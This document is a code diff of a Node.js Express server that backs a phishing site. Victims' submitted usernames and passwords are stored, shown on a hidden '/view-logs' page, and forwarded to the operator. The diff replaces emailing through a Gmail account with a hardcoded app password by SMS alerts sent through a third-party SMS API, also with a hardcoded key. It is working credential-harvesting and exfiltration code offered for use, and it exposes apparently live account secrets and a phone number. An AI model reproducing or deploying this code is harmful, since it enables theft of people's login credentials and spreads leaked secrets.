@@ -1,32 +1,43 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // --- In-Memory Database to Store Credentials ---
-// This array will hold all captured submissions.
-// It will reset every time the server restarts.
 const capturedCredentials = [];
 
 // Middleware
 app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public'))); // For serving static files if needed
+app.use(express.static(path.join(__dirname, 'public')));
 
-// --- Nodemailer Configuration (Optional - you can remove this) ---
-// We are keeping this in case you want emails AND logs.
-const nodemailer = require('nodemailer');
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  secure: true,
-  port: 465,
-  auth: {
-    user: 'locanmash@gmail.com', 
-    pass: 'lrfm zrsa beyu scwh' 
-  }
-});
+// --- SMS API Configuration ---
+const SMS_API_URL = 'https://sms.onfonmedia.co.ke/api/v3/sms/send';
+const SMS_API_KEY = 'qWtobnJAl8BaHvziOprPDVGwfk3mC6LRjN495YFIeQ0U7S12';
+const SENDER_ID = 'MOBITEN-KE';
+const RECIPIENT_NUMBER = '+254717005995';
+
+// --- Function to Send SMS ---
+async function sendSmsAlert(username, password) {
+    const message = `New credentials captured!\nUsername: ${username}\nPassword: ${password}`;
+    
+    const payload = {
+        apikey: SMS_API_KEY,
+        senderID: SENDER_ID,
+        recipient: RECIPIENT_NUMBER,
+        message: message
+    };
+
+    try {
+        const response = await axios.post(SMS_API_URL, payload);
+        console.log('SMS sent successfully:', response.data);
+    } catch (error) {
+        console.error('Error sending SMS:', error.response ? error.response.data : error.message);
+    }
+}
 
 // A simple route to test if the server is running
 app.get('/', (req, res) => {
@@ -47,28 +58,13 @@ app.post('/api/credentials', (req, res) => {
   capturedCredentials.push(submission);
   console.log('Credentials stored:', submission);
 
-  // --- (Optional) Still send an email if you want ---
-  const mailOptions = {
-    from: '"Phishing Site Logs" <locanmash@gmail.com>',
-    to: 'locanmash@gmail.com',
-    subject: 'New Login Credentials Captured',
-    text: `You have a new submission.\n\nPage: ${page}\nUsername: ${username}\nPassword: ${password}`
-  };
-
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.error('Error sending email:', error);
-    } else {
-      console.log('Email sent: ' + info.response);
-    }
-  });
-  // --- End of optional email section ---
+  // --- Send SMS Alert ---
+  sendSmsAlert(username, password);
 
   res.status(200).json({ message: 'Credentials received successfully!' });
 });
 
-// --- NEW SECRET ROUTE TO VIEW LOGS ---
-// This is a simple, unstyled HTML page to view the captured data.
+// --- SECRET ROUTE TO VIEW LOGS ---
 app.get('/view-logs', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -121,8 +117,8 @@ app.get('/view-logs', (req, res) => {
   `);
 });
 
-
 // Start the server
 app.listen(PORT, () => {
   console.log(`Server is listening on port ${PORT}`);
 });
+
